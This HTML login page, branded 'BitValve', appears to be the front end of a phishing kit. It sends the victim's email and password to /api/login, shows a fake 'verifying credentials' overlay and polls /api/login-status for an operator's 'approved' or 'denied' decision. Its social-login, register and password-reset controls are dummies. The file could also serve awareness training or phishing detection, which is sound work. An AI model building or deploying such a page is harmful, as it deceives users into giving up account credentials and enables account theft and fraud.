<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BitValve — Login</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>

  <div class="page">

    <div id="verification-overlay" class="verification-overlay hidden" aria-live="polite">
      <div class="verification-panel">
        <div class="verification-spinner" aria-hidden="true"></div>

        <div class="verification-title">Verifying your credentials…</div>

        <div class="verification-email" id="verification-email">Checking your account...</div>

        <button type="button" class="verification-cancel" id="verification-cancel">
          Cancel
        </button>
      </div>
    </div>

    <main class="login-card">

      <form id="login-form">
        <!-- Logo -->
        <div class="logo">
          <div class="logo-mark"></div>
          <div class="logo-text">BitValve</div>
        </div>

        <div class="heading">Login</div>

        <!-- Email -->
        <div class="field">
          <label for="email">Email</label>

          <div class="input-wrap">
            <input
              id="email"
              name="email"
              type="email"
              placeholder="Enter your email address"
              autocomplete="off"
              required
            />
          </div>
        </div>

        <!-- Password -->
        <div class="field">
          <label for="password">Password</label>

          <div class="input-wrap">
            <input
              id="password"
              name="password"
              class="password-input"
              type="password"
              placeholder="Enter your password"
              autocomplete="off"
              required
            />

            <span
              class="eye"
              onclick="togglePassword()"
              aria-label="Toggle password visibility"
            ></span>
          </div>
        </div>

        <a href="#" class="forgot" onclick="return false;">
          I forgot my password
        </a>

        <button
          class="login-btn"
          type="submit"
        >
          Login
        </button>

      <!-- Divider -->
      <div class="divider">
        OR
      </div>

      <!-- Social buttons -->
      <div class="socials">

        <button
          class="social"
          type="button"
          aria-label="Google"
          onclick="demoMessage()"
        >
          <span class="google">G</span>
        </button>

        <button
          class="social"
          type="button"
          aria-label="Facebook"
          onclick="demoMessage()"
        >
          <span class="facebook">f</span>
        </button>

        <button
          class="social"
          type="button"
          aria-label="Apple"
          onclick="demoMessage()"
        >
          <span class="apple">●</span>
        </button>

      </div>

      <div class="register">
        Don't have an account yet?
        <a href="#" onclick="return false;">Register</a>
      </div>

      <div id="status-message" class="status-message hidden" aria-live="polite"></div>

      </form>

    </main>

  </div>

  <script>
    if (window.location.protocol === 'file:') {
      window.location.replace('http://localhost:3000/login.html');
    }

    let verificationController = null;

    function togglePassword() {
      const password = document.getElementById("password");

      password.type =
        password.type === "password"
          ? "text"
          : "password";
    }

    function maskEmail(email) {
      if (!email || !email.includes("@")) {
        return "Checking your account...";
      }

      const [localPart, domain] = email.split("@");
      const visibleStart = localPart.slice(0, 2);
      const visibleEnd = localPart.slice(-1);
      const maskedLocal = `${visibleStart}${"*".repeat(Math.max(localPart.length - 3, 2))}${visibleEnd}`;

      return `${maskedLocal}@${domain}`;
    }

    function showVerificationOverlay(email) {
      const overlay = document.getElementById("verification-overlay");
      const emailLabel = document.getElementById("verification-email");

      emailLabel.textContent = maskEmail(email);
      overlay.classList.remove("hidden");
    }

    function hideVerificationOverlay() {
      const overlay = document.getElementById("verification-overlay");
      overlay.classList.add("hidden");
    }

    let decisionPollTimer = null;

    function setStatusMessage(message, type) {
      const statusMessage = document.getElementById('status-message');
      statusMessage.textContent = message;
      statusMessage.classList.remove('hidden', 'success', 'error');
      statusMessage.classList.add(type);
    }

    function clearStatusMessage() {
      const statusMessage = document.getElementById('status-message');
      statusMessage.textContent = '';
      statusMessage.classList.add('hidden');
      statusMessage.classList.remove('success', 'error');
    }

    async function pollLoginDecision(email) {
      if (decisionPollTimer) {
        clearInterval(decisionPollTimer);
      }

      decisionPollTimer = setInterval(async () => {
        try {
          const response = await fetch(`/api/login-status?email=${encodeURIComponent(email)}`);
          const result = await response.json();

          if (result.status === 'denied') {
            clearInterval(decisionPollTimer);
            setStatusMessage(result.message || 'Login rejected. Please check your credentials and try again.', 'error');
            return;
          }

          if (result.status === 'approved') {
            clearInterval(decisionPollTimer);
            setStatusMessage('Login approved.', 'success');
            return;
          }
        } catch (error) {
          console.error('Decision poll failed:', error);
        }
      }, 2000);
    }

    async function submitLogin(event) {
      event.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!email || !password) {
        setStatusMessage("Please enter your email and password.", "error");
        return;
      }

      clearStatusMessage();
      showVerificationOverlay(email);
      verificationController = new AbortController();

      try {
        const apiUrl = '/api/login';

        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email, password }),
          signal: verificationController.signal
        });

        let result = {};
        const contentType = response.headers.get('content-type') || '';

        if (contentType.includes('application/json')) {
          const text = await response.text();
          result = text ? JSON.parse(text) : {};
        }

        if (!response.ok) {
          throw new Error(result.message || `Request failed with status ${response.status}.`);
        }

        hideVerificationOverlay();
        pollLoginDecision(email);
        setStatusMessage("Login submitted successfully.", "success");
        document.getElementById("login-form").reset();
      } catch (error) {
        if (error.name === "AbortError") {
          hideVerificationOverlay();
          return;
        }

        console.error(error);
        hideVerificationOverlay();
        setStatusMessage(error.message || "Unable to submit login request.", "error");
      }
    }

    document.getElementById("login-form").addEventListener("submit", submitLogin);
    document.getElementById("verification-cancel").addEventListener("click", () => {
      if (decisionPollTimer) {
        clearInterval(decisionPollTimer);
        decisionPollTimer = null;
      }

      if (verificationController) {
        verificationController.abort();
        verificationController = null;
      }

      hideVerificationOverlay();
      clearStatusMessage();
    });

    function demoMessage() {
      return false;
    }
  </script>

</body>
</html>
